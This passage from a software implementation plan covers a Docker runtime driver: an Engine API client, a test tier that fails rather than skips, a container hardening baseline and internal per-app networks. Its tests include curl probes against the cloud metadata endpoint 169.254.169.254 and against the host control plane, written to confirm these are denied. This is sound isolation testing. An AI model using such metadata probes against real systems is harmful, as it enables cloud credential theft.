      const payload = body === undefined ? undefined : JSON.stringify(body)
      const req = httpRequest(
        {
          socketPath: opts.socketPath,
          path: `/${version}${path}`,
          method,
          headers: payload === undefined
            ? {}
            : { 'content-type': 'application/json', 'content-length': Buffer.byteLength(payload) },
        },
        resolve,
      )
      req.on('error', (error) =>
        reject(
          new EngineError(
            'DOCKER_UNREACHABLE',
            `cannot reach the Docker daemon at ${opts.socketPath}: ${error.message}`,
            'Is Docker Desktop running? `make doctor` checks this first.',
          ),
        ),
      )
      if (payload !== undefined) req.write(payload)
      req.end()
    })

  const collect = async (res: IncomingMessage): Promise<string> => {
    let text = ''
    for await (const chunk of res) text += chunk
    return text
  }

  const json = async <T>(method: string, path: string, body?: unknown): Promise<T | undefined> => {
    const res = await send(method, path, body)
    const text = await collect(res)
    const status = res.statusCode ?? 0
    // 404 is not an error here. §11 makes both destroys idempotent, and a caller
    // that has to string-match an exception message to implement that is a caller
    // that will get it wrong once.
    if (status === 404) return undefined
    if (status >= 400) {
      let message = text
      try {
        message = (JSON.parse(text) as { message?: string }).message ?? text
      } catch {
        /* the daemon answered with something that is not JSON; keep the body */
      }
      throw new EngineError(
        'DOCKER_ENGINE_ERROR',
        `${method} ${path} failed (${status}): ${message}`,
        'The message is the daemon\'s own. Check the container name, image digest or network first.',
        status,
      )
    }
    return text === '' ? undefined : (JSON.parse(text) as T)
  }

  return {
    get: (path) => json('GET', path),
    post: (path, body) => json('POST', path, body),
    del: (path) => json('DELETE', path),
    stream: (path, method = 'GET', body) => send(method, path, body),
  }
}

/** A version pin nobody checks is a 400 arriving three tasks later with no explanation. */
export async function assertApiVersionSupported(engine: EngineClient): Promise<void> {
  const info = await engine.get<{ ApiVersion: string; MinAPIVersion: string; Version: string }>(
    '/version',
  )
  if (!info) {
    throw new EngineError('DOCKER_UNREACHABLE', 'the daemon did not answer /version', 'Is Docker running?')
  }
  // Compare (major, minor) as a pair. Concatenating the digits looks equivalent
  // and stops being so the day Docker ships API 1.100, which would compare as
  // 1100 against 155 and reject a daemon that supports us perfectly well.
  const parts = (v: string): [number, number] => {
    const [major, minor] = v.replace(/^v/, '').split('.')
    return [Number(major), Number(minor)]
  }
  const cmp = (a: [number, number], b: [number, number]) => a[0] - b[0] || a[1] - b[1]
  const pinned = parts(API_VERSION)
  if (cmp(pinned, parts(info.ApiVersion)) > 0 || cmp(pinned, parts(info.MinAPIVersion)) < 0) {
    throw new EngineError(
      'DOCKER_API_VERSION_UNSUPPORTED',
      `this driver pins Docker API ${API_VERSION}, but the daemon (${info.Version}) serves ` +
        `[${info.MinAPIVersion}, ${info.ApiVersion}]`,
      `Upgrade Docker, or change API_VERSION in runtime/docker/engine.ts to a version inside that window.`,
    )
  }
}
```

- [ ] **Step 5: Run the tests**

```bash
pnpm --filter @manifest/control-plane test src/runtime/docker/
```

Expected: PASS — 4 naming tests, 9 engine tests. **No Docker was involved**; the
transport was exercised against a real unix socket served by Node.

- [ ] **Step 6: Prove the 404 rule is load-bearing**

Change `if (status === 404) return undefined` to fall through into the error branch and
run the tests again.

Expected: **FAIL** on *"returns undefined for 404 rather than throwing"*. Restore it.

This is not a nicety: two contract tests in P2's suite — *"status of an unknown id is
gone, never a throw"* and *"destroying an unknown instance is a no-op, not an error"* —
are implemented by this single line, and they are the ones a real daemon is most likely
to break.

- [ ] **Step 7: Commit**

```bash
git add packages/control-plane/src/runtime/docker/
git commit -m "feat(runtime): dependency-free Docker Engine client and the mf- naming scheme"
```

---

## Task 2: The Docker test tier, and the guard that stops it skipping silently

**Files:**
- Create: `packages/control-plane/src/runtime/docker/docker-tier.ts`
- Modify: `vitest.workspace.ts` (a second project)
- Modify: `package.json` (the `test:docker` script)
- Test: `packages/control-plane/src/runtime/docker/docker-tier.test.ts`

**Interfaces:**
- Consumes: `createEngineClient`, `resolveSocketPath` (Task 1).
- Produces:
  - `dockerTierRequested(env?): boolean`
  - `assertDockerAvailable(env?): Promise<void>` — throws `EngineError` with code `DOCKER_TIER_UNAVAILABLE`
  - `describeDocker(name: string, body: () => void): void`

**This task exists because of one lesson, twice paid for.** *"A green result is not
evidence a control is in force."* A Docker-requiring suite that skips when Docker is
absent is green on every machine, including the one where Docker broke — and every
security assertion in Tasks 3, 4, 5 and 18 lives in that tier. So the tier has two
states and no third: **not requested → skip loudly, with the reason printed**;
**requested and unavailable → fail**. `make verify` sets `MANIFEST_TEST_DOCKER=1`, so
CI and the acceptance run cannot silently degrade to a unit-test pass.

`pnpm test` stays Docker-free and fast. §16 calls the fake driver *"the
highest-leverage decision"* in the design precisely because most of the system can be
tested in milliseconds, and P2 cashed that in; this task is what stops P3 spending it.

- [ ] **Step 1: Write the failing test**

`packages/control-plane/src/runtime/docker/docker-tier.test.ts`:

```ts
import { describe, expect, it } from 'vitest'
import { EngineError } from './engine.js'
import { assertDockerAvailable, dockerTierRequested } from './docker-tier.js'

describe('the Docker test tier', () => {
  it('is not requested by default, so `pnpm test` stays Docker-free', () => {
    expect(dockerTierRequested({})).toBe(false)
    expect(dockerTierRequested({ MANIFEST_TEST_DOCKER: '0' })).toBe(false)
  })

  it('is requested by MANIFEST_TEST_DOCKER=1', () => {
    expect(dockerTierRequested({ MANIFEST_TEST_DOCKER: '1' })).toBe(true)
  })

  // THE POINT OF THIS TASK. Requested-but-unavailable must fail, never skip.
  it('fails — does not skip — when it is requested and Docker is unreachable', async () => {
    await expect(
      assertDockerAvailable({ MANIFEST_TEST_DOCKER: '1', MANIFEST_DOCKER_SOCKET: '/nonexistent.sock' }),
    ).rejects.toThrow(EngineError)
    try {
      await assertDockerAvailable({ MANIFEST_TEST_DOCKER: '1', MANIFEST_DOCKER_SOCKET: '/nonexistent.sock' })
    } catch (error) {
      expect((error as EngineError).code).toBe('DOCKER_TIER_UNAVAILABLE')
      expect((error as EngineError).hint).toContain('MANIFEST_TEST_DOCKER')
    }
  })

  it('does nothing when the tier was never requested, even with a bad socket', async () => {
    await expect(
      assertDockerAvailable({ MANIFEST_DOCKER_SOCKET: '/nonexistent.sock' }),
    ).resolves.toBeUndefined()
  })
})
```

- [ ] **Step 2: Run it to make sure it fails**

```bash
pnpm --filter @manifest/control-plane test src/runtime/docker/docker-tier
```

Expected: FAIL — `Cannot find module './docker-tier.js'`.

- [ ] **Step 3: Write the tier**

`packages/control-plane/src/runtime/docker/docker-tier.ts`:

```ts
import { describe } from 'vitest'
import { EngineError, assertApiVersionSupported, createEngineClient, resolveSocketPath } from './engine.js'

export function dockerTierRequested(env: NodeJS.ProcessEnv = process.env): boolean {
  return env.MANIFEST_TEST_DOCKER === '1'
}

/**
 * Two states, never three. Skipping when the tier was ASKED for is how a suite full
 * of security assertions stays green on a machine where none of them ran.
 */
export async function assertDockerAvailable(env: NodeJS.ProcessEnv = process.env): Promise<void> {
  if (!dockerTierRequested(env)) return
  try {
    const engine = createEngineClient({ socketPath: resolveSocketPath(env) })
    await assertApiVersionSupported(engine)
  } catch (error) {
    throw new EngineError(
      'DOCKER_TIER_UNAVAILABLE',
      `MANIFEST_TEST_DOCKER=1 was set but Docker is not usable: ${(error as Error).message}`,
      'Start Docker Desktop and run `make doctor`. Unset MANIFEST_TEST_DOCKER to skip this tier ' +
        'deliberately — but note that every §12 control is asserted in it.',
    )
  }
}

/**
 * Wraps a suite that needs a daemon. When the tier is not requested the suite is
 * skipped with the reason in its name, so a scrollback search for "docker" shows
 * what did not run.
 */
export function describeDocker(name: string, body: () => void): void {
  if (!dockerTierRequested()) {
    describe.skip(`${name} [skipped: set MANIFEST_TEST_DOCKER=1 to run the Docker tier]`, body)
    return
  }
  describe(name, body)
}
```

- [ ] **Step 4: Split the vitest projects and add the script**

> **Corrected 2026-09-05, after P2 executed.** This step was written when
> `vitest.workspace.ts` was `['packages/*']` and nothing else existed. It is now
> load-bearing, and the version this plan originally gave **silently undid two of
> P2's fixes**:
>
> - Defining projects inline stops the workspace picking up
>   `packages/control-plane/vitest.config.ts`, which carries
>   `setupFiles: ['./vitest.setup.ts']` — the file that derives
>   `MANIFEST_DATABASE_URL` from `.env`. Without it `db/client.ts` throws **at
>   import**, and the *whole* suite dies, including the pure tests that need no
>   database. That exact failure is P2 Task 8's recorded defect.
> - `globalSetup: []` on the unit tier removes P2's once-per-run truncate. That is
>   the mechanism that makes a run independent of the state it starts in;
>   `withRollback` does **not** isolate a suite from rows another test committed.
>   Deleting it puts three suites back to being green only when the database
>   happens to be empty — five of P2's 27 defects, reintroduced silently.
>
> There is also now a **root `vitest.config.ts`** carrying `fileParallelism: false`,
> because the API tests truncate and must not race the transactional ones.
> `fileParallelism` is a root-level option and has no effect in a package config.
> **Do not delete that file**; without it the suite fails a different number of
> tests on each run.

`vitest.workspace.ts` — **verified 2026-09-05 by running it**, which the first two
attempts at this fix were not:

```ts
import { defineWorkspace } from 'vitest/config'

// Both projects root INSIDE the package. Not at the repo root: pnpm's strict
// node_modules means `pg` does not resolve from there, and the whole run dies with
// "Failed to load url pg" and `no tests` — which reads like a glob mistake and is
// not one. Rooting here also keeps every path identical to P2's own config.
const PKG = './packages/control-plane'

export default defineWorkspace([
  {
    // The fast tier. No Docker, no network — §16's highest-leverage property. It
    // DOES need Postgres.
    test: {
      name: 'unit',
      root: PKG,
      include: ['src/**/*.test.ts'],
      // Setting `exclude` REPLACES vitest's defaults, so node_modules and dist have
      // to be restated or they are scanned.
      exclude: ['**/node_modules/**', '**/dist/**', '**/*.docker.test.ts'],
      setupFiles: ['./vitest.setup.ts'],
      globalSetup: ['./vitest.global-setup.ts'],
    },
  },
  {
    test: {
      name: 'docker',
      root: PKG,
      include: ['src/**/*.docker.test.ts'],
      testTimeout: 120_000,
      hookTimeout: 120_000,
      setupFiles: ['./vitest.setup.ts'],
      // Order matters: reset the database, then assert the daemon is reachable.
      globalSetup: ['./vitest.global-setup.ts', './src/runtime/docker/tier-setup.ts'],
    },
  },
])
```

**And the root `test` script must name the unit project.** `vitest run` with no
`--project` filter runs **every** project, so `pnpm test` would run the Docker tier
too — the precise thing this task exists to prevent. Verified by adding a throwaway
`scratch.docker.test.ts`: `pnpm test` reported **225** tests rather than 224 until the
script was scoped. In the root `package.json`:

```json
"test": "vitest run --project unit",
"test:docker": "MANIFEST_TEST_DOCKER=1 vitest run --project docker"
```

**Verify this step rather than assuming it.** After editing, `pnpm test` must report
**the same number of tests it did before**, twice in a row. Four distinct failure
modes were hit getting this right, and each has a distinct signature:

| Symptom | Cause |
|---|---|
| `no tests`, plus `Failed to load url pg` | the project root is the repo root; `pg` does not resolve from there |
| the whole suite dies on `MANIFEST_DATABASE_URL` | `setupFiles` is missing |
| passes once, fails on re-run | the `globalSetup` truncate is missing |
| the count goes **up** by the number of Docker tests | the root `test` script is not scoped to `--project unit` |

`packages/control-plane/src/runtime/docker/tier-setup.ts`:

```ts
import { assertDockerAvailable } from './docker-tier.js'

/** Runs once, before any Docker-tier suite. Fails the whole run rather than each file. */
export default async function setup(): Promise<void> {
  await assertDockerAvailable()
}
```

Add to the root `package.json` `scripts`:

```json
"test:docker": "MANIFEST_TEST_DOCKER=1 vitest run --project docker"
```

- [ ] **Step 5: Run both tiers**

```bash
pnpm test                 # unit only; the docker project matches no files yet
pnpm test:docker          # passes trivially — no *.docker.test.ts exists yet
```

Expected: `pnpm test` green and fast, still Docker-free.

- [ ] **Step 6: Prove the guard fails rather than skips**

```bash
MANIFEST_TEST_DOCKER=1 MANIFEST_DOCKER_SOCKET=/nonexistent.sock \
  pnpm --filter @manifest/control-plane test src/runtime/docker/docker-tier
```

Expected: the *"fails — does not skip"* test passes, which is the assertion. Then the
stronger demonstration — change `if (!dockerTierRequested(env)) return` to
`if (true) return` and re-run:

Expected: **FAIL** on *"fails — does not skip — when it is requested and Docker is
unreachable"*. Restore it.

- [ ] **Step 7: Commit**

```bash
git add vitest.workspace.ts package.json packages/control-plane/src/runtime/docker/
git commit -m "test: two-tier test split, with a Docker tier that fails rather than skips"
```

---

## Task 3: §12's hardening baseline, and the two items this driver cannot enforce

**Files:**
- Create: `packages/control-plane/src/runtime/docker/hardening.ts`
- Modify: `packages/control-plane/src/runtime/driver.ts` (one field on `DriverCapabilities`)
- Modify: `packages/control-plane/src/runtime/fake-driver.ts` (report the new field)
- Test: `packages/control-plane/src/runtime/docker/hardening.test.ts`
- Test: `packages/control-plane/src/runtime/docker/hardening.docker.test.ts`

**Interfaces:**
- Consumes: `EngineClient` (Task 1); `InstanceSpec['resources']` from `../driver.js`.
- Produces:
  - `interface HardeningInput { resources; networkName; dnsServer; diskQuotaEnforceable }`
  - `hardenedHostConfig(input: HardeningInput): Record<string, unknown>`
  - `detectHostCapabilities(engine): Promise<{ userns: boolean; diskQuota: boolean }>`
  - `REQUIRED_CAPABILITY_KEYS: Record<keyof DriverCapabilities, true>`

**`driver-contract.ts` is not touched.** See *Decisions*, item 4. The interface gains
`enforcesDiskQuota`; the shared suite stays exactly as P2 wrote it, and the drift
protection is `REQUIRED_CAPABILITY_KEYS`, a `Record<keyof DriverCapabilities, true>`
literal that **fails to compile** if the interface grows a field the Docker driver
does not report.

**The two gaps, and why they are declared rather than papered over.**

- **User-namespace remapping.** S1: `docker info` reports `[name=seccomp,profile=builtin name=cgroupns]` with no `userns`. §12 lists it in a baseline that *"applies to every app, service and sandbox container, on every driver"*, and on Docker Desktop one item cannot.
- **Disk quota.** `--storage-opt size=64M` is **accepted, recorded in `HostConfig`, and does nothing**: a 128 MB write into a 64 MB quota succeeded, with `HostConfig.StorageOpt = map[size:64M]` on the container. Docker Desktop's containerd `overlayfs` snapshotter has no project-quota backing. This makes `InstanceSpec.resources.diskMi` a number nothing enforces, which is exactly the shape §12's *"resource ceilings including `pids` and disk"* is not supposed to have.

**So `StorageOpt` is set only when the daemon can honour it.** Setting a quota that is
silently ignored is worse than not setting one: it puts the number in `docker inspect`
where the next person will read it as enforcement. The detection and the reported
capability come from the same function, so they cannot disagree.

**Everything else in the baseline does enforce**, and the Docker-tier test below reads
it back off a real container rather than trusting the request body — S1's numbers,
automated.

- [ ] **Step 1: Write the failing unit test**

`packages/control-plane/src/runtime/docker/hardening.test.ts`:

```ts
import { describe, expect, it } from 'vitest'
import type { DriverCapabilities } from '../driver.js'
import { REQUIRED_CAPABILITY_KEYS, hardenedHostConfig } from './hardening.js'

const input = {
  resources: { cpu: 0.5, memoryMi: 256, pids: 128, diskMi: 2048 },
  networkName: 'mf-chem-labs-staging-net',
  dnsServer: '10.89.0.53',
  diskQuotaEnforceable: false,
}

describe('§12 container hardening baseline', () => {
  it('produces exactly the flag set S1 measured as enforcing', () => {
    const hc = hardenedHostConfig(input)
    expect(hc.CapDrop).toEqual(['ALL'])
    expect(hc.CapAdd).toEqual([])
    expect(hc.SecurityOpt).toEqual(['no-new-privileges'])
    expect(hc.ReadonlyRootfs).toBe(true)
    expect(hc.Tmpfs).toEqual({ '/tmp': 'rw,noexec,nosuid,size=16m' })
    expect(hc.PidsLimit).toBe(128)
    expect(hc.Memory).toBe(256 * 1024 * 1024)
    expect(hc.NanoCpus).toBe(500_000_000)
    expect(hc.Privileged).toBe(false)
    expect(hc.NetworkMode).toBe('mf-chem-labs-staging-net')
    expect(hc.Dns).toEqual(['10.89.0.53'])
  })

  // §12: "the default seccomp profile, never unconfined". Omitting the option IS
  // the default profile; naming `seccomp=unconfined` is the mistake, and it would
  // arrive as an extra SecurityOpt entry.
  it('never disables seccomp or apparmor', () => {
    const opts = hardenedHostConfig(input).SecurityOpt as string[]
    expect(opts.some((o) => o.includes('unconfined'))).toBe(false)
  })

  // §11: "Failures back off exponentially and surface as an Event; there is no
  // silent retry." A restart policy would turn a crash-loop into a healthy-looking
  // container that never serves.
  it('sets no restart policy, so a crash surfaces instead of looping', () => {
    expect(hardenedHostConfig(input).RestartPolicy).toEqual({ Name: 'no' })
  })

  it('omits StorageOpt when the daemon cannot enforce a disk quota', () => {
    expect(hardenedHostConfig(input).StorageOpt).toBeUndefined()
  })

  it('sets StorageOpt only where it is actually honoured', () => {
    const hc = hardenedHostConfig({ ...input, diskQuotaEnforceable: true })
    expect(hc.StorageOpt).toEqual({ size: '2048m' })
  })

  // The drift guard that replaces editing the shared contract suite. Adding a field
  // to DriverCapabilities without adding it here is a COMPILE error, not a silent
  // omission that a capabilities() consumer would read as "enforced".
  it('enumerates every DriverCapabilities key', () => {
    const keys = Object.keys(REQUIRED_CAPABILITY_KEYS).sort()
    expect(keys).toEqual(
      [
        'enforcesDiskQuota', 'enforcesEgress', 'enforcesUserNamespaceRemapping',
        'isolationLevel', 'remoteTarget', 'supportsExec', 'supportsSnapshot',
      ].sort(),
    )
    const _typecheck: Record<keyof DriverCapabilities, true> = REQUIRED_CAPABILITY_KEYS
    expect(_typecheck).toBe(REQUIRED_CAPABILITY_KEYS)
  })
})
```

- [ ] **Step 2: Run it to make sure it fails**

```bash
pnpm --filter @manifest/control-plane test src/runtime/docker/hardening
```

Expected: FAIL — `Cannot find module './hardening.js'`.

- [ ] **Step 3: Add the capability field to the interface**

In `packages/control-plane/src/runtime/driver.ts`, inside `DriverCapabilities`, after
`enforcesUserNamespaceRemapping`:

```ts
  /**
   * §12 lists "resource ceilings including `pids` and disk". `pids` enforces;
   * disk does not on Docker Desktop. `--storage-opt size=` is accepted by the
   * daemon and recorded in HostConfig, and a 128 MB write into a 64 MB quota
   * succeeds — the containerd `overlayfs` snapshotter has no project-quota
   * backing (S1-controls-settled.md). Declared here, like the userns gap above,
   * rather than implied by an `InstanceSpec.resources.diskMi` nothing honours.
   */
  enforcesDiskQuota: boolean
```

In `packages/control-plane/src/runtime/fake-driver.ts`, add `enforcesDiskQuota: false`
to the default capabilities object, beside the two honesty comments already in it.
**`false` is both the honest value and the convention that file already sets.** P2
wrote `enforcesEgress: false // honest: an in-memory driver enforces nothing` and
`enforcesUserNamespaceRemapping: false // honest: nothing is namespaced`; an
in-memory driver does not enforce a disk quota either. Reporting `true` would be the
exact move Decision 4 refuses — implying an enforcement nothing performs — and it
would silently invert any later contract assertion written as *"if the driver claims
`enforcesDiskQuota`, exceeding the quota must fail."*

**Do not touch `runtime/driver-contract.ts`.** Its capabilities test asserts the
fields it knows about are boolean and stays green; the new field is pinned by
`REQUIRED_CAPABILITY_KEYS` instead.

- [ ] **Step 4: Write the hardening module**

`packages/control-plane/src/runtime/docker/hardening.ts`:

```ts
import type { DriverCapabilities, InstanceSpec } from '../driver.js'
import type { EngineClient } from './engine.js'

export interface HardeningInput {
  resources: InstanceSpec['resources']
  networkName: string
  /** §12: the resolver is per-container, not a network setting. dnsmasq-A's IP. */
  dnsServer: string
  diskQuotaEnforceable: boolean
}

/**
 * §12's baseline, as an Engine API HostConfig. Every value here was read back off a
 * real container in S1 and is read back again by the Docker-tier test beside this
 * file — the request body is what we asked for, and only the readback is evidence.
 */
export function hardenedHostConfig(input: HardeningInput): Record<string, unknown> {
  const { resources } = input
  return {
    CapDrop: ['ALL'],
    // The "minimal, documented add list" §12 allows. It is empty: nothing the
    // blueprint runs needs a capability, and an empty list is the documentation.
    CapAdd: [],
    SecurityOpt: ['no-new-privileges'],
    ReadonlyRootfs: true,
    Tmpfs: { '/tmp': 'rw,noexec,nosuid,size=16m' },
    PidsLimit: resources.pids,
    Memory: resources.memoryMi * 1024 * 1024,
    NanoCpus: Math.round(resources.cpu * 1_000_000_000),
    Privileged: false,
    // §11 has no silent retry: a crash becomes `failed` and an Event, not a loop.
    RestartPolicy: { Name: 'no' },
    NetworkMode: input.networkName,
    Dns: [input.dnsServer],
    // Set ONLY where it is honoured. A quota the daemon ignores still appears in
    // `docker inspect`, where the next reader takes it for enforcement.
    ...(input.diskQuotaEnforceable ? { StorageOpt: { size: `${resources.diskMi}m` } } : {}),
  }
}

/**
 * What the daemon actually provides. Both answers feed `capabilities()` directly, so
 * the reported capability and the flag we set cannot disagree.
 */
export async function detectHostCapabilities(
  engine: EngineClient,
): Promise<{ userns: boolean; diskQuota: boolean }> {
  const info = await engine.get<{
    SecurityOptions?: string[]
    Driver?: string
    DriverStatus?: [string, string][]
  }>('/info')
  const security = info?.SecurityOptions ?? []
  const backing = (info?.DriverStatus ?? []).find(([k]) => k === 'Backing Filesystem')?.[1] ?? ''
  return {
    userns: security.some((o) => o.startsWith('name=userns')),
    // Project quotas need overlay2 over xfs with pquota, or btrfs/zfs. Docker
    // Desktop reports `overlayfs` (the containerd snapshotter) and no backing
    // filesystem, so this is false here — measured, not assumed.
    diskQuota:
      (info?.Driver === 'overlay2' && backing === 'xfs') ||
      info?.Driver === 'btrfs' ||
      info?.Driver === 'zfs',
  }
}

/**
 * Adding a field to DriverCapabilities without adding it here is a COMPILE error.
 * This exists so that the shared contract suite in `runtime/driver-contract.ts`
 * never has to be edited to pin a new capability — P3 imports that file unchanged.
 */
export const REQUIRED_CAPABILITY_KEYS: Record<keyof DriverCapabilities, true> = {
  enforcesEgress: true,
  isolationLevel: true,
  remoteTarget: true,
  supportsExec: true,
  supportsSnapshot: true,
  enforcesUserNamespaceRemapping: true,
  enforcesDiskQuota: true,
}
```

- [ ] **Step 5: Write the Docker-tier readback test**

`packages/control-plane/src/runtime/docker/hardening.docker.test.ts`:

```ts
import { afterAll, expect, it } from 'vitest'
import { createEngineClient, resolveSocketPath } from './engine.js'
import { describeDocker } from './docker-tier.js'
import { detectHostCapabilities, hardenedHostConfig } from './hardening.js'

const engine = createEngineClient({ socketPath: resolveSocketPath() })
const NAME = 'mf-hardening-probe-staging-app'

async function startProbe(overrides: Record<string, unknown> = {}): Promise<void> {
  await engine.del(`/containers/${NAME}?force=true&v=true`)
  const hostConfig = {
    ...hardenedHostConfig({
      resources: { cpu: 0.5, memoryMi: 256, pids: 128, diskMi: 2048 },
      networkName: 'bridge',
      dnsServer: '127.0.0.11',
      diskQuotaEnforceable: false,
    }),
    ...overrides,
  }
  await engine.post(`/containers/create?name=${NAME}`, {
    // alpine:3.22, NOT 3.20. P1's infra/images.txt mirrors 3.22 into the local
    // registry and `make seed` pulls it; 3.20 is in neither, so this step would
    // fail the moment the network is off — which is this plan's own demo.
    Image: 'alpine:3.22',
    User: '10001:10001',
    Cmd: ['sleep', '120'],
    HostConfig: hostConfig,
  })
  await engine.post(`/containers/${NAME}/start`)
}

const readFile = async (path: string): Promise<string> => {
  const exec = await engine.post<{ Id: string }>(`/containers/${NAME}/exec`, {
    AttachStdout: true,
    AttachStderr: true,
    Cmd: ['cat', path],
  })
  const res = await engine.stream(`/exec/${exec!.Id}/start`, 'POST', { Detach: false, Tty: true })
  let out = ''
  for await (const chunk of res) out += String(chunk)
  return out
}

describeDocker('§12 hardening, read back off a real container', () => {
  afterAll(async () => {
    await engine.del(`/containers/${NAME}?force=true&v=true`)
  })

  it('drops every capability, forbids privilege escalation and keeps seccomp on', async () => {
    await startProbe()
    const status = await readFile('/proc/1/status')
    expect(status).toMatch(/CapEff:\s+0000000000000000/)
    expect(status).toMatch(/NoNewPrivs:\s+1/)
    // 2 = filtered by a seccomp profile. 0 would mean unconfined.
    expect(status).toMatch(/Seccomp:\s+2/)
  })

  it('runs non-root with a read-only root and a writable /tmp', async () => {
    const inspect = await engine.get<{
      Config: { User: string }
      HostConfig: { ReadonlyRootfs: boolean; PidsLimit: number; Memory: number; Privileged: boolean }
    }>(`/containers/${NAME}/json`)
    expect(inspect!.Config.User).toBe('10001:10001')
    expect(inspect!.HostConfig.ReadonlyRootfs).toBe(true)
    expect(inspect!.HostConfig.PidsLimit).toBe(128)
    expect(inspect!.HostConfig.Memory).toBe(268_435_456)
    expect(inspect!.HostConfig.Privileged).toBe(false)
  })

  it('reports the two baseline items this daemon cannot deliver', async () => {
    const caps = await detectHostCapabilities(engine)
    // Not asserted as `false`: this is a fact about the machine, and on a Linux
    // host with userns-remap and xfs pquota both would be true. What must hold is
    // that the driver REPORTS what it found, which Task 15 pins against this.
    expect(typeof caps.userns).toBe('boolean')
    expect(typeof caps.diskQuota).toBe('boolean')
    // On Docker Desktop, `docker info` names only seccomp and cgroupns.
    if (process.platform === 'darwin') expect(caps.userns).toBe(false)
  })
})
```

- [ ] **Step 6: Run both tiers**

```bash
pnpm test                                        # unit: 6 hardening tests
pnpm test:docker                                 # the readback, against real Docker
```

Expected: unit green; the Docker tier creates `mf-hardening-probe-staging-app`, reads
`CapEff: 0000000000000000`, `NoNewPrivs: 1`, `Seccomp: 2`, and removes it.

- [ ] **Step 7: Prove the readback is a control, not a formality**

Change the Docker-tier `startProbe()` call in the first test to
`startProbe({ CapDrop: [], CapAdd: ['NET_ADMIN'] })` and re-run `pnpm test:docker`.

Expected: **FAIL** — `CapEff` is no longer all zeros. Restore it.

Without this step the test proves only that a container started. S1's original
`CapEff` reading is the difference between "we asked for the flags" and "the kernel
applied them", and it is the only half that matters.

- [ ] **Step 8: Commit**

```bash
git add packages/control-plane/src/runtime/
git commit -m "feat(runtime): §12 hardening baseline, with the two items Docker Desktop cannot enforce declared

enforcesDiskQuota joins DriverCapabilities: --storage-opt size= is accepted,
recorded in HostConfig, and does nothing on the containerd overlayfs snapshotter.
driver-contract.ts is unchanged; a Record<keyof DriverCapabilities, true> catches
the drift at compile time instead."
```

---

## Task 4: Per-app networks, and the east-west denials as a property of the topology

**Files:**
- Create: `packages/control-plane/src/runtime/docker/networks.ts`
- Test: `packages/control-plane/src/runtime/docker/networks.docker.test.ts`

**Interfaces:**
- Consumes: `EngineClient` (Task 1), `appNetwork` (Task 1).
- Produces:
  - `ensureAppNetwork(engine, slug, kind): Promise<string>` — idempotent, returns the network id
  - `attachPlatformNeighbours(engine, network, names: string[]): Promise<void>`
  - `destroyAppNetwork(engine, slug, kind): Promise<void>`
  - `PLATFORM_NEIGHBOURS = ['manifest-caddy', 'manifest-dnsmasq-containers']`

**The app network is `--internal`, and that single flag is most of §12's east-west section.**
§12 denies, by default: app → any other app or its services; app or sandbox → the
control plane API; → the IdP administrative interface; → `169.254.169.254` and any
metadata endpoint; → UBC management subnets. On an ordinary bridge network **none of
those is denied** — the container has a default route to the gateway, which on Docker
Desktop is the developer's own machine, where the control plane listens on 7100. An
`--internal` network has no gateway, so every one of those denials becomes a property
of the topology rather than a rule someone has to maintain.

**What must then be let back in, deliberately, one attachment at a time:**

| Needs to reach the app network | Why | How |
|---|---|---|
| **Caddy** | the edge has to reach the app to route to it, and §21 says a host process cannot reach container IPs | attached to every app network |
| **dnsmasq (containers)** | §12 makes the resolver **per-container**, and an internal network cannot forward a query to a resolver on another network | attached to every app network |
| **the app's own services** | D3 dedicates them per app+environment | created on this network (Task 6) |
| **the app's own egress proxy** | the only way out (D18) | dual-homed: this network **and** the platform network (Task 5) |

Nothing else. The control plane is not on the list, and it is a **host process**, so
after this task there is no path from an app container to it at all.

**This narrows §21's honest divergence 8**, which currently says *"Workload containers
can reach the developer's own machine… the host remains reachable"* and *"S6 must test
it"*. With an internal app network the app has no route to the host gateway. **The
divergence is not closed** — the *builder* and platform containers are unchanged, and
S6 (Task 18) is what measures the actual reachable set — so this plan does not edit the
spec. It is recorded in *Spec actions proposed by this plan* at the end, for Rich.

- [ ] **Step 1: Write the failing Docker-tier test**

`packages/control-plane/src/runtime/docker/networks.docker.test.ts`:

```ts
import { afterAll, beforeAll, expect, it } from 'vitest'
import { createEngineClient, resolveSocketPath } from './engine.js'
import { describeDocker } from './docker-tier.js'
import { appNetwork } from './names.js'
import { destroyAppNetwork, ensureAppNetwork } from './networks.js'

const engine = createEngineClient({ socketPath: resolveSocketPath() })
const SLUG = 'nettest'
const KIND = 'staging' as const

/**
 * Runs one command on a network and returns curl's EXIT CODE. Judging by exit code
 * rather than by grepping output is deliberate: P1's self-review caught a check
 * whose failure message contained the very word it was grepping for.
 */
async function curlExit(network: string, args: string[]): Promise<number> {
  const created = await engine.post<{ Id: string }>('/containers/create', {
    Image: 'curlimages/curl:8.11.1',
    Cmd: ['-sS', '-m', '5', '-o', '/dev/null', ...args],
    HostConfig: { NetworkMode: network, AutoRemove: false },
  })
  const id = created!.Id
  try {
    await engine.post(`/containers/${id}/start`)
    const wait = await engine.post<{ StatusCode: number }>(`/containers/${id}/wait`)
    return wait!.StatusCode
  } finally {
    await engine.del(`/containers/${id}?force=true&v=true`)
  }
}

describeDocker('per-app networks and §12 east-west denials', () => {
  beforeAll(async () => {
    await ensureAppNetwork(engine, SLUG, KIND)
  })
  afterAll(async () => {
    await destroyAppNetwork(engine, SLUG, KIND)
  })

  it('is idempotent — the second call returns the same network', async () => {
    const first = await ensureAppNetwork(engine, SLUG, KIND)
    const second = await ensureAppNetwork(engine, SLUG, KIND)
    expect(second).toBe(first)
  })

  it('creates the network as internal, which is what makes the denials real', async () => {
    const net = await engine.get<{ Internal: boolean; Name: string }>(
      `/networks/${appNetwork(SLUG, KIND)}`,
    )
    expect(net!.Internal).toBe(true)
    expect(net!.Name).toBe('mf-nettest-staging-net')
  })

  it('DENIES the control plane: an app container has no route to the host', async () => {
    // 7100 is the control plane (§21). On a bridge network this would connect.
    expect(await curlExit(appNetwork(SLUG, KIND), ['http://host.docker.internal:7100/'])).not.toBe(0)
  })

  it('DENIES the cloud metadata endpoint', async () => {
    expect(
      await curlExit(appNetwork(SLUG, KIND), ['http://169.254.169.254/latest/meta-data/']),
    ).not.toBe(0)
  })

  it('DENIES the public internet — there is no egress until Task 5 gives it one', async () => {
    expect(await curlExit(appNetwork(SLUG, KIND), ['https://registry.npmjs.org/'])).not.toBe(0)
  })

  // THE NEGATIVE CONTROL. The three denials above must be caused by `internal: true`
  // and nothing else. On an ordinary bridge network the same probes must SUCCEED —
  // otherwise they are passing because the image is broken, the timeout is too
  // short, or the machine is offline, and they would keep passing after someone
  // removed the flag.
  it('NEGATIVE CONTROL: the same probes succeed on an ordinary bridge network', async () => {
